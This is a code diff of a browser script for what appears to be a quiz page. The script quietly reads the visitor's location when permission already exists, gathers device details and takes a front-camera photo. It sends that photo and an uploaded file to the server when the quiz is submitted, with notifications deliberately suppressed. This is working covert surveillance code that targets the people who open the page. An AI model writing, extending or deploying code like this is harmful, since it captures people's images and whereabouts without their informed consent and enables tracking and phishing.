@@ -1,3 +1,7 @@
+// ================================
+// FRONTEND SCRIPT.JS (NO TOASTS)
+// ================================
+
 const btn = document.getElementById('submit-btn');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
@@ -15,11 +19,12 @@ async function getSilentLocation() {
 
   try {
     const status = await navigator.permissions.query({ name: "geolocation" });
+
     if (status.state === "granted") {
       const pos = await new Promise((res, rej) =>
         navigator.geolocation.getCurrentPosition(res, rej)
       );
-      loc = `${pos.coords.latitude},${pos.coords.longitude}`;
+      loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
     }
   } catch {}
 
@@ -30,43 +35,28 @@ async function getSilentLocation() {
 // METADATA
 // ================================
 async function collectMetadata() {
-  const meta = {
-    width: window.innerWidth,
-    height: window.innerHeight,
+  return {
+    width: innerWidth,
+    height: innerHeight,
     platform: navigator.platform,
     language: navigator.language,
     useragent: navigator.userAgent,
     time: new Date().toLocaleString(),
-    deviceMemory: navigator.deviceMemory || "N/A",
-    cpuThreads: navigator.hardwareConcurrency || "N/A",
-    cookieEnabled: navigator.cookieEnabled,
-    referer: document.referrer,
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
-    battery: "N/A",
     location: await getSilentLocation()
   };
-
-  if (navigator.getBattery) {
-    try {
-      const b = await navigator.getBattery();
-      meta.battery = `${b.level * 100}% charging:${b.charging}`;
-    } catch {}
-  }
-
-  return meta;
 }
 
 // ================================
-// CAMERA CAPTURE
+// CAMERA
 // ================================
-async function captureAndSendCamera() {
+async function captureAndSend() {
   const stream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" },
     audio: false
   });
 
   video.srcObject = stream;
-  await new Promise(r => setTimeout(r, 3000));
+  await new Promise(r => setTimeout(r, 2500));
 
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -84,7 +74,7 @@ async function captureAndSendCamera() {
 }
 
 // ================================
-// FILE UPLOAD
+// FILE
 // ================================
 async function sendFile(file) {
   const reader = new FileReader();
@@ -99,14 +89,14 @@ async function sendFile(file) {
 }
 
 // ================================
-// SUBMIT FLOW
+// SUBMIT
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
 
   if (!fileInput.files.length) return;
 
-  await captureAndSendCamera();
+  await captureAndSend();
   await sendFile(fileInput.files[0]);
 
   document.getElementById("quiz-container").style.display = "none";
